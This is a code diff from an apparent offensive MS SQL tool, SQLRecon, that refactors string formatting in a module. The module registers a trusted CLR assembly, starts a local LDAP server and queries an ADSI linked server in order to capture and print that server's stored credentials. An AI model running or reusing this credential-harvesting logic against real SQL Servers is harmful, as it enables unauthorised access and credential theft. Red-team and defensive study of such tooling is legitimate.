@@ -71,8 +71,7 @@ namespace SQLRecon.Modules
             }
 
             // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteQuery(con, "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
-                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");
+            _sqlQuery.ExecuteQuery(con, $"EXEC sp_add_trusted_assembly 0x{dllHash},N'{dllPath}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");
 
             // Verify that the SHA-512 hash has been added.
             sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies;");
@@ -152,14 +151,14 @@ namespace SQLRecon.Modules
                 return;
             }
 
-            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);
+            _print.Status($"Starting a local LDAP server on port {port}", true);
 
             /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
             * This is a long running query that will hang the 'con' connection object until
             * an LDAP connection has been established.
             */
             Task.Run(() =>
-                sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT dbo." + function + "(" + port + ");")
+                sqlOutput = _sqlQuery.ExecuteCustomQuery(con, $"SELECT dbo.{function}({port});")
             );
 
             _print.Status("Executing LDAP solicitation ...", true);
@@ -168,13 +167,15 @@ namespace SQLRecon.Modules
             *  connection to the database.This is because the first
             *  connection object ('con') is being used to run the LDAP server.
             */
+            _print.Status("Creating second MS SQL connection because first one is used to run LDAP server", true);
             SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();
 
-            string queryTwo = "SELECT * FROM ''LDAP://localhost:" + port + "'' ";
+            string queryTwo = $"SELECT * FROM 'LDAP://localhost:{port}'";
 
             // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
             _sqlQuery.ExecuteTunnelCustomQuery(conTwo, adsiServer, queryTwo);
             _sqlQuery.ExecuteTunnelCustomQuery(conTwo, adsiServer, queryTwo);
+
 
             // Check to see if the credentials have been obtained.
             if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
@@ -183,7 +184,9 @@ namespace SQLRecon.Modules
             }
             else
             {
-                _print.Success(string.Format("Obtained ADSI link credentials.{0}", sqlOutput.Replace("column0", "")), true);
+
+                _print.Success($"Obtained ADSI link credentials", true);
+                Console.WriteLine(sqlOutput);
             }
 
             // Cleaning up.
